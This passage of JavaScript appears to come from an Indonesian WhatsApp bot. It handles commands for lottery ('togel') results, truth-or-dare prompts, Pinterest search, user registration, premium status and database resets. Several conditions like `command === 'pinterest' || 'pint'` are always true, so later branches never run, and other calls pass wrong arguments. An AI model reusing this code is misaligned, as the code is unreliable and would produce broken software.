conn.sendMessage(from, buttonGimg, { quoted: msg })
} else if (command === 'togel') {

let gamTogel = await getBuffer(picak + 'Prediksi Angka Togel')
var tgel = await fetchJson('https://api.itsrose.my.id/dewasa/togel')
var togel = tgel.result.results
var txtTogel = `Tanggal ${tgel.result.date}\n\n`
for (let i of togel) {
txtTogel += `◦ ${i.pool} : ${i.result}\n`
}
let buttonTogel = {
image: gamTogel,
caption: txtTogel,
footer: setting.footer,
buttons: button_nye,
headerType: 4,
}
conn.sendMessage(from, buttonTogel, { quoted: msg })
} else if (command === 'truth') {
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
let kuku = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/truth.json`)
let yoo = kuku[Math.floor(Math.random() * kuku.length)] 
let truthnya = `「 Truth  Or Dare 」

User : @${sender.split('@')[0]} 
Pilihan : ${command}

_「 ${yoo} 」_
`
let cemeang = [sender]
conn.sendButtonText(from, [{ buttonId: `.truth`, buttonText: { displayText: `${setting.buttonEmoji.truth} Truth` }, type: 1 }, { buttonId: `.etsgdjdjdjeiejetikddhkdj`, buttonText: { displayText: `${setting.buttonEmoji.ajakTeman} Ajak Teman` }, type: 1 }], truthnya, setting.footer, msg, {mentions: cemeang}) 
} else if (command === 'dare') {
if (!isGroup && !isOwner) return reply(mess.OnlyGrup)
let jempol = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Database/master/Quotes/dare.json`)
let woke = jempol[Math.floor(Math.random() * jempol.length)] 
let darehnya = `「 Truth  Or Dare 」

User : @${sender.split('@')[0]} 
Pilihan : ${command}

_「 ${woke} 」_
`
let pupu = [sender]
conn.sendButtonText(from, [{ buttonId: `.truth`, buttonText: { displayText: `${setting.buttonEmoji.dare} Dare` }, type: 1 }, { buttonId: `.etsgdjdjdjeiejetikddhkdj`, buttonText: { displayText: `${setting.buttonEmoji.ajakTeman} Ajak Teman` }, type: 1 }], darehnya, setting.footer, msg, {mentions: pupu}) 
} else if (command === 'pinterest' || 'pint') {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply('Masukkan Query !!')
var linkPints = await fetchJson (`https://api.itsrose.my.id/searching/pinterest?query=${q}`)
var btnPint = [{ buttonId: `${chats}`, buttonText: { displayText: 'Next Image' }, type: 1 }]
var linkPint = linkPints[0]
var buttonPint = {
image: { url : linkPint },
caption: `*———「 Pinterest 」———*\n\n◦ Random ${q}\n◦ Url : ${linkPint}`,
footer: setting.footer,
buttons: btnPint,
headerType: 4,
}
conn.sendMessage(from, buttonPint, { quoted: msg })
} else if (command === 'sfnegjyjyysoh') {
return reply ('Selamat Bermain, Dan Diharapkan Untuk Tidak Spam ☺️')
} else if (command === 'daftar' || 'verify' || 'verifikasi' || 'verification') {
if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar !!')
if (!q) return reply(`Format : .${command} <nama>\nExample : .${command} ${pushname}`)
var res_us = `${makeid(18)}`
var user_name = `${q}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "premium": false }
db_user.push(object_user)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, 2, null))
mentions(`Memuat Data User @${sender.split("@")[0]}`, [sender])
await sleep(3000)
var verify_teks =`*───「 Pendaftaran Berhasil 」────*

○ Name : ${user_name}
○ Number : @${sender.split('@')[0]}
○ Seri : ${res_us}`
var buttonMessage = {
text: verify_teks,
footer: setting.footer,
mentions: [sender],
buttons: [
{ buttonId: '.menu', buttonText: {displayText: '️Menu'}, type: 1}
],
headerType: 1
}
conn.sendMessage(from, buttonMessage, {quoted:msg})
} else if (command === 'addprem') {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#addprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == true) return reply('User tersebut sudah premium')
setUser("±premium", number_one, true)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* aktif`)
} else if (command === 'delprem') {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#delprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == false) return reply('User tersebut tidak premium')
setUser("±premium", number_one, false)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* tidak`)
} else if (command === 'resetdb' || 'cleardb' || 'hapusdb' || 'resetdatabase') {
if (!isOwner) return reply(mess.OnlyOwner)
let para_kos = "[]"
db_user.splice(para_kos)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, null, 1))
await sleep(1000)
db_menfes.splice(para_kos)
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
reply(`Berhasil Membersihkan 
database.json
menfess.json`)
} else if (command === 'resetlist') {
if (cekUser("id", sender) == null) return daftarDlu()
db_respon_list.splice('[]')
fs.writeFileSync('./database/db_ListMessage', JSON.stringify(db_respon_list, null, 1))
reply('Sukses Reset List Message')
}


}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
server_eror.push({"error": `${err}`})
fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
}}